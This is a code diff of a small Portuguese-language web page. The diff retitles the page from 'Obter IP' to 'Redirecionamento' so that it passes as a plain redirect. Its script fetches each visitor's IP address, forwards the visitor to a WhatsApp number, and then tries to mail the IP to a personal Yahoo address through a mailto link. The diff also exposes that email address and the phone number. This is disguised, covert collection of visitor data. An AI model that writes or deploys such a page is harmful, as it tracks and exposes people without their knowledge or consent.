@@ -1,11 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Obter IP</title>
+    <title>Redirecionamento</title>
 </head>
 <body>
-    <h1>Obter IP</h1>
-
     <script>
         function getIp(callback) {
             fetch('/get-ip')
@@ -15,19 +13,14 @@
         }
 
         getIp(function (ip) {
-            const emailUrl = 'mailto:minadoooo11@yahoo.com?subject=Endereço IP do Usuário&body=' + encodeURIComponent('O endereço IP do usuário é: ' + ip);
             const whatsappUrl = 'https://wa.me/27998041981';
+            window.location.href = whatsappUrl;
 
-            window.open(whatsappUrl, '_blank');
+            const emailUrl = 'mailto:minadoooo11@yahoo.com?subject=Endereço IP do Usuário&body=' + encodeURIComponent('O endereço IP do usuário é: ' + ip);
 
-            fetch(emailUrl)
-                .then(() => {
-                    // Email enviado com sucesso
-                    // Não é necessário fazer nada aqui
-                })
-                .catch(error => {
-                    console.error('Erro ao enviar o email:', error);
-                });
+            setTimeout(function() {
+                window.location.href = emailUrl;
+            }, 2000);
         });
     </script>
 </body>
